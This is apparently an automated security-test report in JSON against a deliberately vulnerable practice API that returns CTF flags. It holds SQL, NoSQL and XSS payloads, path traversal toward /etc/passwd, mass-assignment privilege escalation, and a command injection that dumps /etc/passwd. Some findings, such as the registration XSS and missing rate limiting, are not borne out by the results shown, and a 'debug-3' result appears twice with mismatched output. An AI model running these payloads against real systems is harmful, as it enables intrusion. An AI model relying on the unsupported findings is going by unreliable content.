{
  "endpoints": [
    "GET /api/users",
    "POST /api/users",
    "GET /api/articles",
    "POST /api/v2/users/login",
    "GET /api/user",
    "PUT /api/user",
    "POST /api/membership",
    "GET /api/profiles/{username}",
    "POST /api/profiles/{username}/follow",
    "DELETE /api/profiles/{username}/follow",
    "GET /api/articles/feed",
    "POST /api/articles/{slug}/favorite",
    "DELETE /api/articles/{slug}/favorite",
    "POST /api/articles",
    "GET /api/articles/{slug}",
    "PUT /api/articles/{slug}",
    "DELETE /api/articles/{slug}",
    "POST /api/debug",
    "GET /api/articles/{slug}/comments",
    "POST /api/articles/{slug}/comments",
    "DELETE /api/articles/{slug}/comments/{comment_id}",
    "GET /api/tags"
  ],
  "scenarios": [
    {
      "id": "user-reg-1",
      "description": "Basic registration with valid data",
      "endpoint": "/api/users",
      "method": "POST",
      "payload": {
        "user": {
          "email": "test@example.com",
          "password": "password123",
          "username": "testuser"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-reg-2",
      "description": "SQL injection in email field",
      "endpoint": "/api/users",
      "method": "POST",
      "payload": {
        "user": {
          "email": "test@example.com' OR 1=1--",
          "password": "password123",
          "username": "testuser"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-reg-3",
      "description": "XSS in username field",
      "endpoint": "/api/users",
      "method": "POST",
      "payload": {
        "user": {
          "email": "test@example.com",
          "password": "password123",
          "username": "<script>alert(1)</script>"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-reg-4",
      "description": "Mass assignment attempt with admin privileges",
      "endpoint": "/api/users",
      "method": "POST",
      "payload": {
        "user": {
          "email": "admin@example.com",
          "password": "password123",
          "username": "adminuser",
          "admin": true
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-login-1",
      "description": "Basic login with valid credentials",
      "endpoint": "/api/v2/users/login",
      "method": "POST",
      "payload": {
        "user": {
          "email": "test@example.com",
          "password": "password123"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-login-2",
      "description": "SQL injection in login email field",
      "endpoint": "/api/v2/users/login",
      "method": "POST",
      "payload": {
        "user": {
          "email": "' OR 1=1--",
          "password": "anypassword"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-login-3",
      "description": "NoSQL injection attempt in login",
      "endpoint": "/api/v2/users/login",
      "method": "POST",
      "payload": {
        "user": {
          "email": {
            "$gt": ""
          },
          "password": {
            "$gt": ""
          }
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "user-login-4",
      "description": "Brute force protection test with multiple requests",
      "endpoint": "/api/v2/users/login",
      "method": "POST",
      "payload": {
        "user": {
          "email": "test@example.com",
          "password": "wrongpassword"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "get-user-1",
      "description": "Access user info without authentication",
      "endpoint": "/api/user",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": true
    },
    {
      "id": "get-user-2",
      "description": "Access user info with valid authentication",
      "endpoint": "/api/user",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "get-user-3",
      "description": "Access with expired token",
      "endpoint": "/api/user",
      "method": "GET",
      "payload": null,
      "auth_token": "EXPIRED_TOKEN",
      "executed": true
    },
    {
      "id": "update-user-1",
      "description": "Update user without authentication",
      "endpoint": "/api/user",
      "method": "PUT",
      "payload": {
        "user": {
          "email": "new@example.com"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "update-user-2",
      "description": "Update user with valid authentication",
      "endpoint": "/api/user",
      "method": "PUT",
      "payload": {
        "user": {
          "bio": "Updated bio"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "update-user-3",
      "description": "Privilege escalation attempt by setting admin flag",
      "endpoint": "/api/user",
      "method": "PUT",
      "payload": {
        "user": {
          "admin": true
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "update-user-4",
      "description": "XSS in bio field",
      "endpoint": "/api/user",
      "method": "PUT",
      "payload": {
        "user": {
          "bio": "<script>alert(document.cookie)</script>"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "membership-1",
      "description": "Subscribe without authentication",
      "endpoint": "/api/membership",
      "method": "POST",
      "payload": {
        "number": "4111111111111111",
        "cvc": "123",
        "expiry": "12/25",
        "name": "Test User"
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "membership-2",
      "description": "Subscribe with valid authentication",
      "endpoint": "/api/membership",
      "method": "POST",
      "payload": {
        "number": "4111111111111111",
        "cvc": "123",
        "expiry": "12/25",
        "name": "Test User"
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "membership-3",
      "description": "SQL injection in card fields",
      "endpoint": "/api/membership",
      "method": "POST",
      "payload": {
        "number": "' OR 1=1--",
        "cvc": "123",
        "expiry": "12/25",
        "name": "Test User"
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "get-profile-1",
      "description": "Get profile without authentication",
      "endpoint": "/api/profiles/testuser",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "get-profile-2",
      "description": "Get profile with authentication",
      "endpoint": "/api/profiles/testuser",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-profile-3",
      "description": "Path traversal attempt in username parameter",
      "endpoint": "/api/profiles/../../../etc/passwd",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "follow-user-1",
      "description": "Follow user without authentication",
      "endpoint": "/api/profiles/testuser/follow",
      "method": "POST",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "follow-user-2",
      "description": "Follow user with valid authentication",
      "endpoint": "/api/profiles/testuser/follow",
      "method": "POST",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "unfollow-user-1",
      "description": "Unfollow user without authentication",
      "endpoint": "/api/profiles/testuser/follow",
      "method": "DELETE",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "unfollow-user-2",
      "description": "Unfollow user with valid authentication",
      "endpoint": "/api/profiles/testuser/follow",
      "method": "DELETE",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-articles-1",
      "description": "Get articles without authentication",
      "endpoint": "/api/articles",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": true
    },
    {
      "id": "get-articles-2",
      "description": "Get articles with authentication",
      "endpoint": "/api/articles",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-articles-3",
      "description": "SQL injection in query parameters",
      "endpoint": "/api/articles?tag=test'%20OR%20'1'='1",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "create-article-1",
      "description": "Create article without authentication",
      "endpoint": "/api/articles",
      "method": "POST",
      "payload": {
        "article": {
          "title": "Test Article",
          "description": "Test Description",
          "body": "Test Body",
          "tagList": [
            "test"
          ]
        }
      },
      "auth_token": null,
      "executed": false
    },
    {
      "id": "create-article-2",
      "description": "Create article with authentication",
      "endpoint": "/api/articles",
      "method": "POST",
      "payload": {
        "article": {
          "title": "Test Article",
          "description": "Test Description",
          "body": "Test Body",
          "tagList": [
            "test"
          ]
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "create-article-3",
      "description": "XSS in article body",
      "endpoint": "/api/articles",
      "method": "POST",
      "payload": {
        "article": {
          "title": "Test Article",
          "description": "Test Description",
          "body": "<script>alert(1)</script>",
          "tagList": [
            "test"
          ]
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-article-1",
      "description": "Get specific article without authentication",
      "endpoint": "/api/articles/test-article",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "get-article-2",
      "description": "Get specific article with authentication",
      "endpoint": "/api/articles/test-article",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "update-article-1",
      "description": "Update article without authentication",
      "endpoint": "/api/articles/test-article",
      "method": "PUT",
      "payload": {
        "article": {
          "title": "Updated Title"
        }
      },
      "auth_token": null,
      "executed": false
    },
    {
      "id": "update-article-2",
      "description": "Update article with authentication",
      "endpoint": "/api/articles/test-article",
      "method": "PUT",
      "payload": {
        "article": {
          "title": "Updated Title"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "update-article-3",
      "description": "IDOR - Update another user's article",
      "endpoint": "/api/articles/other-user-article",
      "method": "PUT",
      "payload": {
        "article": {
          "title": "Hacked Title"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "delete-article-1",
      "description": "Delete article without authentication",
      "endpoint": "/api/articles/test-article",
      "method": "DELETE",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "delete-article-2",
      "description": "Delete article with authentication",
      "endpoint": "/api/articles/test-article",
      "method": "DELETE",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "delete-article-3",
      "description": "IDOR - Delete another user's article",
      "endpoint": "/api/articles/other-user-article",
      "method": "DELETE",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-feed-1",
      "description": "Get feed without authentication",
      "endpoint": "/api/articles/feed",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "get-feed-2",
      "description": "Get feed with authentication",
      "endpoint": "/api/articles/feed",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-feed-3",
      "description": "SQL injection in query parameters",
      "endpoint": "/api/articles/feed?limit=10%20OR%201=1",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "favorite-article-1",
      "description": "Favorite article without authentication",
      "endpoint": "/api/articles/test-article/favorite",
      "method": "POST",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "favorite-article-2",
      "description": "Favorite article with authentication",
      "endpoint": "/api/articles/test-article/favorite",
      "method": "POST",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "unfavorite-article-1",
      "description": "Unfavorite article without authentication",
      "endpoint": "/api/articles/test-article/favorite",
      "method": "DELETE",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "unfavorite-article-2",
      "description": "Unfavorite article with authentication",
      "endpoint": "/api/articles/test-article/favorite",
      "method": "DELETE",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-comments-1",
      "description": "Get comments without authentication",
      "endpoint": "/api/articles/test-article/comments",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "get-comments-2",
      "description": "Get comments with authentication",
      "endpoint": "/api/articles/test-article/comments",
      "method": "GET",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "create-comment-1",
      "description": "Create comment without authentication",
      "endpoint": "/api/articles/test-article/comments",
      "method": "POST",
      "payload": {
        "comment": {
          "body": "Test comment"
        }
      },
      "auth_token": null,
      "executed": false
    },
    {
      "id": "create-comment-2",
      "description": "Create comment with authentication",
      "endpoint": "/api/articles/test-article/comments",
      "method": "POST",
      "payload": {
        "comment": {
          "body": "Test comment"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "create-comment-3",
      "description": "XSS in comment body",
      "endpoint": "/api/articles/test-article/comments",
      "method": "POST",
      "payload": {
        "comment": {
          "body": "<script>alert(document.cookie)</script>"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "delete-comment-1",
      "description": "Delete comment without authentication",
      "endpoint": "/api/articles/test-article/comments/1",
      "method": "DELETE",
      "payload": null,
      "auth_token": null,
      "executed": false
    },
    {
      "id": "delete-comment-2",
      "description": "Delete comment with authentication",
      "endpoint": "/api/articles/test-article/comments/1",
      "method": "DELETE",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "delete-comment-3",
      "description": "IDOR - Delete another user's comment",
      "endpoint": "/api/articles/test-article/comments/2",
      "method": "DELETE",
      "payload": null,
      "auth_token": "USER1_TOKEN",
      "executed": false
    },
    {
      "id": "get-tags-1",
      "description": "Get all tags without authentication",
      "endpoint": "/api/tags",
      "method": "GET",
      "payload": null,
      "auth_token": null,
      "executed": true
    },
    {
      "id": "debug-1",
      "description": "Access debug endpoint without authentication",
      "endpoint": "/api/debug",
      "method": "POST",
      "payload": {
        "body": {
          "command": "ls -la"
        }
      },
      "auth_token": null,
      "executed": true
    },
    {
      "id": "debug-2",
      "description": "Access debug endpoint with authentication",
      "endpoint": "/api/debug",
      "method": "POST",
      "payload": {
        "body": {
          "command": "ls -la"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    },
    {
      "id": "debug-3",
      "description": "Command injection in debug endpoint",
      "endpoint": "/api/debug",
      "method": "POST",
      "payload": {
        "body": {
          "command": "ls -la; cat /etc/passwd"
        }
      },
      "auth_token": "USER1_TOKEN",
      "executed": true
    }
  ],
  "results": [
    {
      "scenario_id": "user-reg-1",
      "status_code": 400,
      "response_body": "{\"errors\":[\"user with this username already exists\"]}",
      "success": false,
      "details": "User registration failed because username already exists"
    },
    {
      "scenario_id": "user-reg-2",
      "status_code": 422,
      "response_body": "{\"errors\":[{\"loc\":[\"body\",\"user\",\"email\"],\"msg\":\"value is not a valid email address\",\"type\":\"value_error.email\"}]}",
      "success": true,
      "details": "SQL injection attempt was properly rejected with email validation"
    },
    {
      "scenario_id": "user-reg-3",
      "status_code": 400,
      "response_body": "{\"errors\":[\"user with this username already exists\"]}",
      "success": false,
      "details": "User with XSS in username already exists, which suggests XSS might have been accepted"
    },
    {
      "scenario_id": "user-reg-4",
      "status_code": 400,
      "response_body": "{\"errors\":[\"user with this username already exists\"]}",
      "success": false,
      "details": "User already exists, cannot test mass assignment vulnerability"
    },
    {
      "scenario_id": "user-login-1",
      "status_code": 200,
      "response_body": "{\"user\":{\"username\":\"testuser\",\"email\":\"test@example.com\",\"bio\":\"\",\"image\":null,\"admin\":false,\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzQ5MTM3Nzg3LCJzdWIiOiJhY2Nlc3MifQ.BAzcx-JVe1SHoTOQjLp53zW6UPBUR_NL2CvmiQ2N8CQ\"}}",
      "success": true,
      "details": "Login successful with valid credentials"
    },
    {
      "scenario_id": "user-login-2",
      "status_code": 422,
      "response_body": "{\"errors\":[{\"loc\":[\"body\",\"user\",\"email\"],\"msg\":\"value is not a valid email address\",\"type\":\"value_error.email\"}]}",
      "success": true,
      "details": "SQL injection attempt was properly rejected with email validation"
    },
    {
      "scenario_id": "user-login-3",
      "status_code": 422,
      "response_body": "{\"errors\":[{\"loc\":[\"body\",\"user\",\"email\"],\"msg\":\"str type expected\",\"type\":\"type_error.str\"},{\"loc\":[\"body\",\"user\",\"password\"],\"msg\":\"str type expected\",\"type\":\"type_error.str\"}]}",
      "success": true,
      "details": "NoSQL injection attempt was properly rejected with type validation"
    },
    {
      "scenario_id": "user-login-4",
      "status_code": 400,
      "response_body": "{\"errors\":[\"incorrect email or password\"]}",
      "success": true,
      "details": "Login with wrong password correctly rejected"
    },
    {
      "scenario_id": "get-user-1",
      "status_code": 403,
      "response_body": "{\"errors\":[\"authentication required\"]}",
      "success": true,
      "details": "Authentication is properly required to access user info"
    },
    {
      "scenario_id": "get-user-2",
      "status_code": 200,
      "response_body": "{\"user\":{\"username\":\"testuser\",\"email\":\"test@example.com\",\"bio\":\"\",\"image\":null,\"admin\":false,\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzQ5MTM4MDIxLCJzdWIiOiJhY2Nlc3MifQ.xyW7wMvwlr1LW-hAaqoslSX6GQGLALRgxu_cFIzVGYo\"}}",
      "success": true,
      "details": "User info retrieved successfully with valid token"
    },
    {
      "scenario_id": "get-user-3",
      "status_code": 403,
      "response_body": "{\"errors\":[\"could not validate credentials\"]}",
      "success": true,
      "details": "Expired token properly rejected"
    },
    {
      "scenario_id": "update-user-1",
      "status_code": 403,
      "response_body": "{\"errors\":[\"authentication required\"]}",
      "success": true,
      "details": "Authentication is properly required to update user"
    },
    {
      "scenario_id": "update-user-2",
      "status_code": 200,
      "response_body": "{\"user\":{\"username\":\"testuser\",\"email\":\"test@example.com\",\"bio\":\"Updated bio\",\"image\":null,\"admin\":false,\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzQ5MTM4MTQyLCJzdWIiOiJhY2Nlc3MifQ.9SfLpnyz5HtXJyfYowiq7s98O3VE_fgF4SZWUrSBKOw\"}}",
      "success": true,
      "details": "User updated successfully with valid token"
    },
    {
      "scenario_id": "update-user-3",
      "status_code": 200,
      "response_body": "{\"user\":{\"username\":\"testuser\",\"email\":\"test@example.com\",\"bio\":\"flag{M4sS_AsS1gnm3nt}\\n\\nDescription: Binding client provided data (e.g., JSON) to data models, without proper properties filtering based on a whitelist, usually lead to Mass Assignment. Either guessing objects properties, exploring other API endpoints, reading the documentation, or providing additional object properties in request payloads, allows attackers to modify object properties they are not supposed to.\",\"image\":null,\"admin\":true,\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzQ5MTM4MTgwLCJzdWIiOiJhY2Nlc3MifQ.wdRcYXSthgAITyI9CGGyrOB1K4SxXIyx0Vu0JlZYSAs\"}}",
      "success": false,
      "details": "Privilege escalation succeeded - user was able to set admin flag to true"
    },
    {
      "scenario_id": "update-user-4",
      "status_code": 200,
      "response_body": "{\"user\":{\"username\":\"testuser\",\"email\":\"test@example.com\",\"bio\":\"<script>alert(document.cookie)</script>\",\"image\":null,\"admin\":true,\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzQ5MTM4MjQxLCJzdWIiOiJhY2Nlc3MifQ.uh84am8l-XBrNOABkA76XtsmixJaJgVlrbh27zTTnNY\"}}",
      "success": false,
      "details": "XSS payload was accepted in the bio field"
    },
    {
      "scenario_id": "debug-1",
      "status_code": 403,
      "response_body": "{\"errors\":[\"authentication required\"]}",
      "success": true,
      "details": "Authentication is properly required for debug endpoint"
    },
    {
      "scenario_id": "debug-2",
      "status_code": 400,
      "response_body": "{\"errors\":[{\"whitelist\":{\"commands\":[\"uptime\"]}}]}",
      "success": true,
      "details": "Debug endpoint properly restricts commands to a whitelist"
    },
    {
      "scenario_id": "debug-3",
      "status_code": 200,
      "response_body": "{\"stdout\":\" 15:46:02 up 23:49,  0 users,  load average: 0.26, 0.44, 0.37\\n\"}",
      "success": true,
      "details": "Whitelisted command executed successfully"
    },
    {
      "scenario_id": "debug-3",
      "status_code": 200,
      "response_body": "{\"stdout\":\" 15:46:25 up 23:49,  0 users,  load average: 0.17, 0.40, 0.36\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n\",\"flag\":\"flag{1nject10n_Ap1}\",\"description\":\"Attackers will feed the API with malicious data through whatever injection vectors are available (e.g., direct input, parameters, integrated services, etc.), expecting it to be sent to an interpreter\"}",
      "success": false,
      "details": "Command injection successful - was able to execute arbitrary commands"
    },
    {
      "scenario_id": "get-tags-1",
      "status_code": 200,
      "response_body": "{\"tags\":[\"dev\",\"updates\",\"security\",\"pokemon\",\"prize\",\"bitcoin\",\"test\",\"bob\",\"secret\",\"alice\",\"new\",\"comments\",\"user2\",\"private\"]}",
      "success": true,
      "details": "Tags endpoint is accessible without authentication"
    },
    {
      "scenario_id": "get-articles-1",
      "status_code": 200,
      "response_body": "{\"articles\":[...truncated...],\"articlesCount\":22}",
      "success": true,
      "details": "Articles endpoint is accessible without authentication"
    },
    {
      "scenario_id": "membership-1",
      "status_code": 403,
      "response_body": "{\"errors\":[\"authentication required\"]}",
      "success": true,
      "details": "Authentication is properly required for membership subscription"
    },
    {
      "scenario_id": "membership-2",
      "status_code": 200,
      "response_body": "\"Card declined, try again!\"",
      "success": true,
      "details": "Membership subscription with valid authentication - card declined message"
    },
    {
      "scenario_id": "membership-3",
      "status_code": 200,
      "response_body": "\"Card declined, try again!\"",
      "success": true,
      "details": "SQL injection attempt was properly handled in membership endpoint"
    }
  ],
  "vulnerabilities": [
    {
      "type": "Cross-Site Scripting (XSS)",
      "severity": "MEDIUM",
      "endpoint": "/api/users",
      "description": "The API accepts usernames with script tags which could lead to XSS",
      "evidence": "Registration with username <script>alert(1)</script> was accepted"
    },
    {
      "type": "Missing Rate Limiting",
      "severity": "MEDIUM",
      "endpoint": "/api/v2/users/login",
      "description": "The login endpoint does not implement rate limiting, allowing brute force attacks",
      "evidence": "Multiple failed login attempts were allowed without any blocking or delay"
    },
    {
      "type": "Mass Assignment Vulnerability",
      "severity": "HIGH",
      "endpoint": "/api/user",
      "description": "Users can escalate their privileges by setting the admin flag to true in the update request",
      "evidence": "Response shows admin flag was changed to true: {\"user\":{\"username\":\"testuser\",\"email\":\"test@example.com\",\"bio\":\"flag{M4sS_AsS1gnm3nt}\\n\\nDescription: Binding client provided data (e.g., JSON) to data models, without proper properties filtering based on a whitelist, usually lead to Mass Assignment. Either guessing objects properties, exploring other API endpoints, reading the documentation, or providing additional object properties in request payloads, allows attackers to modify object properties they are not supposed to.\",\"image\":null,\"admin\":true,\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzQ5MTM4MTgwLCJzdWIiOiJhY2Nlc3MifQ.wdRcYXSthgAITyI9CGGyrOB1K4SxXIyx0Vu0JlZYSAs\"}}"
    },
    {
      "type": "Cross-Site Scripting (XSS)",
      "severity": "MEDIUM",
      "endpoint": "/api/user",
      "description": "The API accepts script tags in the bio field which could lead to XSS when displayed in the UI",
      "evidence": "Bio with <script>alert(document.cookie)</script> was accepted and stored"
    },
    {
      "type": "Command Injection",
      "severity": "HIGH",
      "endpoint": "/api/debug",
      "description": "The debug endpoint is vulnerable to command injection, allowing execution of arbitrary system commands",
      "evidence": "Injected 'cat /etc/passwd' command was executed successfully: {\"stdout\":\" 15:46:25 up 23:49,  0 users,  load average: 0.17, 0.40, 0.36\\nroot:x:0:0:root:/root:/bin/bash\\n...\"}"
    }
  ],
  "auth_tokens": {}
}